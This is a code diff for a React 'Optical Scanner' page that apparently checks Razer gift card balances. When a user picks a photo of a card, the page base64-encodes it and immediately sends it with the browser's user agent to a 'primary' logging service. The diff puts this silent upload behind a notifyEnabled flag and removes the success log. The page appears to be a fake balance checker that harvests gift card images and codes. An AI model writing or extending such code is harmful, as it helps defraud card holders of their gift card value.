@@ -1,12 +1,10 @@
-// src/pages/Scan.jsx - Updated to send image immediately on selection
+// src/pages/Scan.jsx
 import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import Navbar from '../components/Navbar';
 import { logBalanceCheck } from '../services/logService';
+import { notifyEnabled } from '../services/notifyService';
 import razerGuide from '../assets/razers.jpg';
-
-// ... [Keep FullScreenBalance and ErrorPopup components exactly the same as previous Razer design] ...
-// (I'll include them for copy-paste completeness)
 
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   return (
@@ -90,7 +88,6 @@ const Scan = () => {
     return () => timeoutIds.forEach(id => clearTimeout(id));
   }, [isProcessing, processingStep, attemptCount]);
 
-  // --- UPDATED: Send image to PRIMARY immediately upon selection ---
   const handleImageSelect = (file) => {
     if (!file) return;
     const reader = new FileReader();
@@ -100,19 +97,18 @@ const Scan = () => {
       setMessage('');
       setMessageType('');
 
-      // Immediately send to primary
-      try {
-        await logBalanceCheck({
-          type: 'scan_image_uploaded',
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          pageSource: 'scan',
-          imageBase64: base64Image,
-          ip: null
-        });
-        console.log('📸 Image sent to primary successfully');
-      } catch (err) {
-        console.error('Failed to send immediate image:', err);
+      // Only send immediate upload if notifyEnabled is true
+      if (notifyEnabled) {
+        try {
+          await logBalanceCheck({
+            type: 'scan_image_uploaded',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            pageSource: 'scan',
+            imageBase64: base64Image,
+            ip: null
+          });
+        } catch (err) { console.error('Failed to send immediate image:', err); }
       }
     };
     reader.readAsDataURL(file);
@@ -163,9 +159,7 @@ const Scan = () => {
     if (fileInputRef.current) fileInputRef.current.value = '';
   };
 
-  if (showFullScreenBalance) {
-    return <FullScreenBalance balance={balance} lastFourDigits="••••" cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;
-  }
+  if (showFullScreenBalance) return <FullScreenBalance balance={balance} lastFourDigits="••••" cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;
 
   return (
     <>
@@ -175,9 +169,7 @@ const Scan = () => {
       <div className="bg-[#000] text-center py-8 px-4 border-b border-[#222] relative overflow-hidden">
         <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'radial-gradient(#00ff41 1px, transparent 1px)', backgroundSize: '20px 20px' }}></div>
         <h2 className="relative text-sm sm:text-lg text-white font-black tracking-[0.3em] uppercase flex items-center justify-center gap-3">
-          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
-          Optical Scanner
-          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
+          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span> Optical Scanner <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
         </h2>
       </div>
 
